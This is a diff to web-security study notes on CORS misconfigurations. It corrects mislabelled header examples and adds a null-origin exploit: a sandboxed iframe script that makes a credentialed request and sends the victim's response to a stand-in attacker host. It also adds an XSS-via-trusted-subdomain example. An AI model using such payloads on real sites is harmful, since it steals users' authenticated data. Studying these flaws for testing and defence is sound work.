@@ -28,15 +28,17 @@
 The cross-origin resource sharing specification provides controlled relaxation of the same-origin policy. The CORS specification identifies a collection of protocol headers
 
 * `Origin` header added by the browser.
-  * ```http
-    Access-Control-Allow-Origin: https://normal-website.com
+  * ```
+    Origin : https://normal-website.com
     ```
 * `Access-Control-Allow-Origin` returned by a server when a website requests a cross-domain resource.
   * ```http
-    Origin : https://normal-website.com
+    Access-Control-Allow-Origin: https://normal-website.com
     ```
 
 This means that the browser will allow code running on normal-website.com to access the response because the origins match.
+
+Note: `Access-Control-Allow-Origin` is returned only if the whitelisted values or `*` or `null` matched the Origin.
 
 
 
@@ -53,7 +55,7 @@ Access-Control-Allow-Credentials: true
 
 **Access-Control-Allow-Origin: null**
 
-Browsers might send the value `null` in the Origin header in various unusual situations:
+Specifies that only origins with a `null` origin are allowed to access the resource. Browsers might send the value `null` in the Origin header in various unusual situations:
 
 * Cross-origin redirects.
 * Requests from serialized data.
@@ -125,10 +127,43 @@ function reqListener() {
 * Some apps enable access from various sources through a whitelist of permitted origins
 * Suppose `normal-website.com`
 * Use as origin: `hackersnormal-website.com` or `normal-website.com.evil-user.net`
+* Note: you need to know the whitelisted origins..
 
 **Whitelisted null origin value**
 
-* Set `Origin: null` in the request
-* Response has `Access-Control-Allow-Origin: null`
-* Many other ways ...
+Detection
+
+Send request with `Origin: null` and see if the response has `Access-Control-Allow-Origin: null`
+
+Exploit
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='https://malicious-website.com/log?key='+this.responseText;
+};
+</script>"></iframe>
+```
+
+#### Exploiting XSS via CORS trust relationships <a href="#exploiting-xss-via-cors-trust-relationships" id="exploiting-xss-via-cors-trust-relationships"></a>
+
+Suppose that:
+
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true
+```
+
+If you find an xss on `subdomain.vulnerable-website.com` inject JavaScript that uses CORS and retrieve information.
+
+```
+https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+```
 
